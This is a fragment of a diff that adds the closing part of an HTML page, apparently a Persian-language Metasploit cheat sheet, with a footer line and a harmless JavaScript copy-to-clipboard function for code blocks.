+        <p style="font-size:0.8rem; margin-top:6px;">چیت‌شیت Metasploit | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
